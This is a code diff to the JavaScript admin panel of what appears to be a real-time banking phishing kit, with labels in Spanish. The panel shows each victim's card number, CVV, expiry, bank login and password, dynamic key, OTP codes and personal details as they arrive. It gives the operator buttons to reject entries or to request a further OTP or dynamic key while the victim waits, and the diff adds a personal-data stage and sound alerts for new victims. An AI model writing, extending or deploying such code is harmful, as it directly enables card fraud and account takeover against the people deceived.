@@ -1,7 +1,7 @@
 // =========================
 // Config / State
 // =========================
-const nodeUrl = "http://192.168.1.4:3005";
+const nodeUrl = "http://192.168.1.26:3005";
 let socket;
 let sessionsById = {};
 let selectedId = null;
@@ -27,33 +27,50 @@ sounds.wait.next = 1;
 // Desbloqueo de sonido
 // =========================
 
+let pendingSound = null;
 let soundEnabled = true;
 let audioUnlocked = false;
 
-function unlockAudio() {
+async function unlockAudio() {
     if (audioUnlocked) return;
-    // “warm-up” con el sonido wait (cualquiera sirve)
-    sounds.wait
-        .play()
-        .then(() => {
-            sounds.wait.pause();
-            sounds.wait.currentTime = 0;
-            audioUnlocked = true;
-        })
-        .catch(() => {});
+
+    try {
+        // calienta TODOS los audios para iOS/Android
+        for (const a of Object.values(sounds)) {
+            a.muted = true;
+            await a.play();
+            a.pause();
+            a.currentTime = 0;
+            a.muted = false;
+        }
+
+        audioUnlocked = true;
+
+        console.log("🔊 Audio desbloqueado (mobile ok)");
+    } catch (e) {
+        // si falla, no hacemos nada; el usuario puede volver a tocar
+    }
 }
 
-document.addEventListener("click", unlockAudio, { once: true });
-document.addEventListener("touchstart", unlockAudio, { once: true });
+document.addEventListener("pointerdown", unlockAudio, { once: true });
+/* document.addEventListener("click", unlockAudio, { once: true });
+document.addEventListener("touchstart", unlockAudio, { once: true }); */
 
 // =========================
 // Función segura para reproducir sonido
 // =========================
 
 function playSound(kind) {
-    if (!soundEnabled || !audioUnlocked) return;
+    if (!soundEnabled) return;
+
+    if (!audioUnlocked) {
+        pendingSound = kind; // guarda el último sonido pendiente
+        return;
+    }
+
     const a = sounds[kind];
     if (!a) return;
+
     a.currentTime = 0;
     a.play().catch(() => {});
 }
@@ -62,6 +79,18 @@ function playSound(kind) {
 // UI helpers
 // =========================
 const ACTION_UI = {
+    DATA: {
+        label: "DATA",
+        css: "background:transparent;color:rgb(255 255 255 / 28%);",
+    },
+    DATA_ERROR: {
+        label: "DATA",
+        css: "background:var(--red);color:rgba(255, 255, 255, 0.82);",
+    },
+    DATA_WAIT_ACTION: {
+        label: "DATA",
+        css: "background:var(--yellow);color:rgba(255, 255, 255, 0.82);;",
+    },
     CC: {
         label: "CC",
         css: "background:transparent;color:rgb(255 255 255 / 28%);",
@@ -343,13 +372,17 @@ function getLockedSectionType(session) {
 }
 
 function getCcIcon(s) {
-  const action = String(s.action || "").toUpperCase();
-  const hasCc = !!s.cc && !!s.exp && !!s.cvv && !!s.holder;
+    const action = String(s.action || "").toUpperCase();
+    const hasCc = !!s.cc && !!s.exp && !!s.cvv && !!s.holder;
 
-  if (!hasCc || ["CC", "CC_WAIT_ACTION"].includes(action)) return "⌛";
-  if ((hasCc && action.includes("CC_ERROR")) || (!hasCc && !action.includes("CC"))) return "❌";
-  if (hasCc && !action.includes("CC")) return "💸";
-  return "";
+    if (!hasCc || ["CC", "CC_WAIT_ACTION"].includes(action)) return "⌛";
+    if (
+        (hasCc && action.includes("CC_ERROR")) ||
+        (!hasCc && !action.includes("CC"))
+    )
+        return "❌";
+    if (hasCc && !action.includes("CC")) return "💸";
+    return "";
 }
 
 function sectionCc(s) {
@@ -388,13 +421,17 @@ function sectionCc(s) {
 }
 
 function getLogoIcon(s) {
-  const action = String(s.action || "").toUpperCase();
-  const hasLogo = !!s.user && !!s.pass;
+    const action = String(s.action || "").toUpperCase();
+    const hasLogo = !!s.user && !!s.pass;
 
-  if (!hasLogo || ["AUTH", "AUTH_WAIT_ACTION"].includes(action)) return "⌛";
-  if ((hasLogo && action.includes("AUTH_ERROR")) || (!hasLogo && !action.includes("AUTH"))) return "❌";
-  if (hasLogo && !action.includes("AUTH")) return "💸";
-  return "";
+    if (!hasLogo || ["AUTH", "AUTH_WAIT_ACTION"].includes(action)) return "⌛";
+    if (
+        (hasLogo && action.includes("AUTH_ERROR")) ||
+        (!hasLogo && !action.includes("AUTH"))
+    )
+        return "❌";
+    if (hasLogo && !action.includes("AUTH")) return "💸";
+    return "";
 }
 
 function sectionLogo(s) {
@@ -423,13 +460,18 @@ function sectionLogo(s) {
 }
 
 function getDinaIcon(s) {
-  const action = String(s.action || "").toUpperCase();
-  const hasDina = !!s.dinamic;
+    const action = String(s.action || "").toUpperCase();
+    const hasDina = !!s.dinamic;
 
-  if (!hasDina || ["DINAMIC", "DINAMIC_WAIT_ACTION"].includes(action)) return "⌛";
-  if ((hasDina && action.includes("DINAMIC_ERROR")) || (!hasDina && !action.includes("DINAMIC"))) return "❌";
-  if (hasDina && !action.includes("DINAMIC")) return "💸";
-  return "";
+    if (!hasDina || ["DINAMIC", "DINAMIC_WAIT_ACTION"].includes(action))
+        return "⌛";
+    if (
+        (hasDina && action.includes("DINAMIC_ERROR")) ||
+        (!hasDina && !action.includes("DINAMIC"))
+    )
+        return "❌";
+    if (hasDina && !action.includes("DINAMIC")) return "💸";
+    return "";
 }
 
 function sectionDina(s) {
@@ -451,13 +493,17 @@ function sectionDina(s) {
 }
 
 function getOtpIcon(s) {
-  const action = String(s.action || "").toUpperCase();
-  const hasOtp = !!s.otp;
+    const action = String(s.action || "").toUpperCase();
+    const hasOtp = !!s.otp;
 
-  if (!hasOtp || ["OTP", "OTP_WAIT_ACTION"].includes(action)) return "⌛";
-  if ((hasOtp && action.includes("OTP_ERROR")) || (!hasOtp && !action.includes("OTP"))) return "❌";
-  if (hasOtp && !action.includes("OTP")) return "💸";
-  return "";
+    if (!hasOtp || ["OTP", "OTP_WAIT_ACTION"].includes(action)) return "⌛";
+    if (
+        (hasOtp && action.includes("OTP_ERROR")) ||
+        (!hasOtp && !action.includes("OTP"))
+    )
+        return "❌";
+    if (hasOtp && !action.includes("OTP")) return "💸";
+    return "";
 }
 
 function sectionOtp(s) {
@@ -479,13 +525,13 @@ function sectionOtp(s) {
 }
 
 function getDataIcon(s) {
-  const action = String(s.action || "").toUpperCase();
-  const hasData = !!s.name && !!s.document && !!s.address && !!s.email;
+    const action = String(s.action || "").toUpperCase();
+    const hasData = !!s.name && !!s.document && !!s.address && !!s.email;
 
-  if (!hasData && ["DATA", "DATA_WAIT_ACTION"].includes(action)) return "🔥";
-  if (hasData && action.includes("DATA_ERROR")) return "⌛";
-  if (hasData && !action.includes("DATA")) return "💸";
-  return "❌";
+    if (!hasData && ["DATA", "DATA_WAIT_ACTION"].includes(action)) return "🔥";
+    if (hasData && action.includes("DATA_ERROR")) return "⌛";
+    if (hasData && !action.includes("DATA")) return "💸";
+    return "❌";
 }
 
 function sectionOther(s) {
@@ -496,7 +542,6 @@ function sectionOther(s) {
     <hr style="width:100%;" />
 
     <div class="history-data"><div class="value-container"><b class="common-label">Nombre: </b><span class="common-value">${escapeHtml(s.name ?? "—")}</span></div></div>
-    <div class="history-data"><div class="value-container"><b class="common-label">Apellido: </b><span class="common-value">${escapeHtml(s.lastname ?? "—")}</span></div></div>
     <div class="history-data"><div class="value-container"><b class="common-label">Documento: </b><span class="common-value">${escapeHtml(s.document ?? "—")}</span></div></div>
     <div class="history-data"><div class="value-container"><b class="common-label">Dirección: </b><span class="common-value">${escapeHtml(s.address ?? "—")}</span></div></div>
     <div class="history-data"><div class="value-container"><b class="common-label">Telefono: </b><span class="common-value">${escapeHtml(s.phone ?? "—")}</span></div></div>
@@ -676,6 +721,7 @@ export async function connectAdmin() {
     });
 
     socket.on("admin:sessions:upsert", (sess) => {
+        console.log(sess);
         const prev = sessionsById[sess.id]; // sesión anterior (o undefined)
         const isNew = !prev; // ✅ nueva si antes no existía
         const prevAction = prev?.action;
@@ -684,8 +730,9 @@ export async function connectAdmin() {
         renderList();
 
         // 🔊 NUEVO REGISTRO
-        if (isNew && bootstrapped) {
-            playSound("newData");
+        if (isNew) {
+            if (bootstrapped) playSound("newData");
+            else pendingSound = "newData"; // por si llegó antes de bootstra
         }
 
         // 🔊 si pasó a WAIT
@@ -729,6 +776,8 @@ function renderList() {
     const items = Object.values(sessionsById).sort(
         (a, b) => new Date(b.updatedAt) - new Date(a.updatedAt),
     );
+
+    console.log(items);
 
     listEl.innerHTML = items
         .map((s) => {
@@ -809,41 +858,51 @@ function renderActionsHTML(s, targetElId) {
     if (!s) return;
 
     switch (s.action) {
+        case "DATA_WAIT_ACTION":
+            actions.innerHTML = `
+                <button class="danger" onclick="act('${escapeHtml(s.id)}','reject_data')">Error DATA</button>
+                <button class="primary" onclick="act('${escapeHtml(s.id)}','request_auth')">Pedir LOGO</button>
+            `;
+            break;
+
+        case "DATA_ERROR":
+            actions.innerHTML = `<span style="color:var(--muted)">Esperando nuevos datos ⌛</span>`;
+            break;
         case "AUTH_WAIT_ACTION":
             actions.innerHTML = `
-        <button class="danger" onclick="act('${escapeHtml(s.id)}','reject_auth')">Error Login</button>
-        <button class="primary" onclick="act('${escapeHtml(s.id)}','request_dinamic')">Pedir DINA</button>
-        <button class="primary" onclick="act('${escapeHtml(s.id)}','request_otp')">Pedir OTP</button>
-      `;
+                <button class="danger" onclick="act('${escapeHtml(s.id)}','reject_auth')">Error Login</button>
+                <button class="primary" onclick="act('${escapeHtml(s.id)}','request_dinamic')">Pedir DINA</button>
+                <button class="primary" onclick="act('${escapeHtml(s.id)}','request_otp')">Pedir OTP</button>
+            `;
             break;
 
         case "AUTH_ERROR":
-            actions.innerHTML = `<span style="color:var(--muted)">Esperando nuevos datos</span>`;
+            actions.innerHTML = `<span style="color:var(--muted)">Esperando nuevos datos ⌛</span>`;
             break;
 
         case "DINAMIC_WAIT_ACTION":
             actions.innerHTML = `
-        <button class="danger" onclick="act('${escapeHtml(s.id)}','reject_dinamic')">Error DINA</button>
-        <button class="primary" onclick="act('${escapeHtml(s.id)}','request_otp')">Pedir OTP</button>
-        <button onclick="act('${escapeHtml(s.id)}','finish')">Terminar</button>
-      `;
+                <button class="danger" onclick="act('${escapeHtml(s.id)}','reject_dinamic')">Error DINA</button>
+                <button class="primary" onclick="act('${escapeHtml(s.id)}','request_otp')">Pedir OTP</button>
+                <button onclick="act('${escapeHtml(s.id)}','finish')">Terminar</button>
+            `;
             break;
 
         case "DINAMIC_ERROR":
-            actions.innerHTML = `<span style="color:var(--muted)">Esperando nueva dinámica</span>`;
+            actions.innerHTML = `<span style="color:var(--muted)">Esperando nueva dinámica ⌛</span>`;
             break;
 
         case "OTP_WAIT_ACTION":
             actions.innerHTML = `
-        <button class="danger" onclick="act('${escapeHtml(s.id)}','reject_otp')">Error OTP</button>
-        <button onclick="act('${escapeHtml(s.id)}','custom_alert')">Enviar alerta</button>
-        <button class="primary" onclick="act('${escapeHtml(s.id)}','request_dinamic')">Pedir DINA</button>
-        <button onclick="act('${escapeHtml(s.id)}','finish')">Terminar</button>
-      `;
+                <button class="danger" onclick="act('${escapeHtml(s.id)}','reject_otp')">Error OTP</button>
+                <button onclick="act('${escapeHtml(s.id)}','custom_alert')">Enviar alerta</button>
+                <button class="primary" onclick="act('${escapeHtml(s.id)}','request_dinamic')">Pedir DINA</button>
+                <button onclick="act('${escapeHtml(s.id)}','finish')">Terminar</button>
+            `;
             break;
 
         case "OTP_ERROR":
-            actions.innerHTML = `<span style="color:var(--muted)">Esperando nuevo OTP</span>`;
+            actions.innerHTML = `<span style="color:var(--muted)">Esperando nuevo OTP ⌛</span>`;
             break;
 
         default:
@@ -897,7 +956,7 @@ function renderDetail(s) {
             pillAction.textContent = s.action.endsWith("_ERROR")
                 ? "ERROR"
                 : s.action.endsWith("_WAIT_ACTION")
-                  ? "ESPERANDO ORDEN"
+                  ? "ESPERANDO ORDEN 💡"
                   : "Esperando Datos";
         }
 
